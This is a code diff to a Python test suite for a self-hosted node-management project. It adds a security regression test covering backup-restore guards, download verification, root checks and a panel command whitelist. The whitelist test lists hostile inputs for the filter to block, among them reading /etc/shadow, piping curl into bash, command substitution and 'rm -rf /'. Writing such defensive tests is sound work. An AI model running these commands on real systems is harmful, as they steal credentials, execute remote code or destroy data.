@@ -1342,20 +1342,90 @@ def test_ip_customizable():
         else:
             log_pass(f"{script} 无硬编码节点 IP (IP 全部来自清单)")
 
-    # 3) 库能反映环境变量覆盖 (证明 IP 确实可自定义)
-    probe = subprocess.run(
-        ["bash", "-c",
-         'ONECLOUD_WK_EDGE_01_IP=10.99.0.5 ONECLOUD_WK_EDGE_01_HOSTNAME=edge99 '
-         'source "$(dirname "$0")/lib-nodes.sh" 2>/dev/null; '
-         'echo "$(node_ip wk-edge-01)"; echo "$(node_hostname wk-edge-01)"'],
-        cwd=str(SCRIPTS_DIR),
-        capture_output=True, text=True
-    )
-    out = probe.stdout.strip().splitlines()
-    if len(out) >= 2 and out[0] == "10.99.0.5" and out[1] == "edge99":
-        log_pass("lib-nodes.sh 支持环境变量覆盖 IP/主机名 (自定义生效)")
+    # 4) 节点 .env 生成器可用 (把自定义 IP 贯通到容器运行时)
+    if (SCRIPTS_DIR / "gen-node-env.sh").exists():
+        r = subprocess.run(["bash", str(SCRIPTS_DIR / "gen-node-env.sh"), "--dry-run"],
+                           capture_output=True, text=True, cwd=str(PROJECT_ROOT))
+        if r.returncode == 0 and "NODE_IP=" in r.stdout:
+            log_pass("gen-node-env.sh 可渲染节点 .env (自定义 IP 贯通到容器)")
+        else:
+            log_fail("gen-node-env.sh 渲染失败", r.stderr[:120])
     else:
-        log_fail(f"环境变量覆盖未生效, 输出: {out}")
+        log_fail("缺少 scripts/gen-node-env.sh")
+
+
+def test_safety_regression():
+    """测试 14: 安全与健壮性回归 (已修缺陷不得复现)"""
+    print("\n" + "="*60)
+    print("测试 14: 安全与健壮性回归")
+    print("="*60)
+
+    # 1) restore.sh: 'latest' 且无备份时必须报错, 不能退化成备份根目录
+    restore = SCRIPTS_DIR / "restore.sh"
+    if restore.exists():
+        src = restore.read_text(encoding="utf-8")
+        if 'BACKUP_ID" = "latest"' in src and "没有可用备份" in src:
+            log_pass("restore.sh 对 latest 无备份场景有守卫")
+        else:
+            log_fail("restore.sh 缺少 latest 空备份守卫",
+                     "否则 BACKUP_PATH 会退化成备份根目录, 误恢复整个备份目录")
+
+    # 2) 原生安装器: 下载产物须校验 + root 检查
+    inst = SCRIPTS_DIR / "install-services.sh"
+    if inst.exists():
+        src = inst.read_text(encoding="utf-8")
+        if "is_elf_binary" in src:
+            log_pass("install-services.sh 校验下载产物为可执行文件")
+        else:
+            log_fail("install-services.sh 未校验下载产物", "404 页面可能被当成安装成功")
+        if "require_root" in src:
+            log_pass("install-services.sh 对原生安装有 root 权限检查")
+        else:
+            log_fail("install-services.sh 缺少 root 权限检查")
+
+    # 3) setup.sh: 二进制下载同样需要校验
+    setup = SCRIPTS_DIR / "setup.sh"
+    if setup.exists():
+        src = setup.read_text(encoding="utf-8")
+        if "is_elf_binary" in src:
+            log_pass("setup.sh 校验二进制下载产物")
+        else:
+            log_fail("setup.sh 未校验二进制下载产物")
+
+    # 4) 节点内重复安装器应委派到统一脚本, 不得各自实现
+    dup = {
+        "node-wk-edge-01/clash/install-binary.sh": "mihomo",
+        "node-wk-iot-02/xiaomusic/install.sh": "xiaomusic",
+    }
+    for rel, target in dup.items():
+        p = PROJECT_ROOT / rel
+        if not p.exists():
+            continue
+        src = p.read_text(encoding="utf-8")
+        if "install-services.sh" in src and target in src:
+            log_pass(f"{rel} 已委派统一安装脚本 (无重复实现)")
+        else:
+            log_fail(f"{rel} 仍在重复实现安装逻辑", "易与 install-services.sh 产生行为分叉")
+
+    # 5) 面板命令白名单: 必须拦住 shell 元字符 (前缀匹配可被 'cmd; evil' 绕过)
+    app = PANEL_DIR / "app.py"
+    if app.exists():
+        try:
+            src = app.read_text(encoding="utf-8")
+            seg = src[src.index("ALLOWED_CMD_PREFIXES"):src.index("def load_config")]
+            ns = {}
+            exec(seg, ns)
+            safe = ns["is_command_safe"]
+            must_pass = ["free -h", "df -h", "docker ps", "uptime", "cat /proc/loadavg"]
+            must_block = ["free; cat /etc/shadow", "uptime && curl http://x|bash",
+                          "ls `whoami`", "date $(id)", "rm -rf /"]
+            bad = [c for c in must_pass if not safe(c)] + [c for c in must_block if safe(c)]
+            if not bad:
+                log_pass("面板命令白名单: 正常命令放行, 元字符与危险命令被拦截")
+            else:
+                log_fail(f"面板命令白名单判定异常: {bad}")
+        except Exception as e:
+            log_fail(f"面板白名单校验失败: {e}")
 
 
 # ============ 主程序 ============
@@ -1380,6 +1450,7 @@ def main():
         ("服务一致性", test_service_consistency),
         ("文档化 CLI 接口契约", test_cli_contract),
         ("节点 IP 自定义与主机名", test_ip_customizable),
+        ("安全与健壮性回归", test_safety_regression),
     ]
     
     for test_name, test_func in tests:
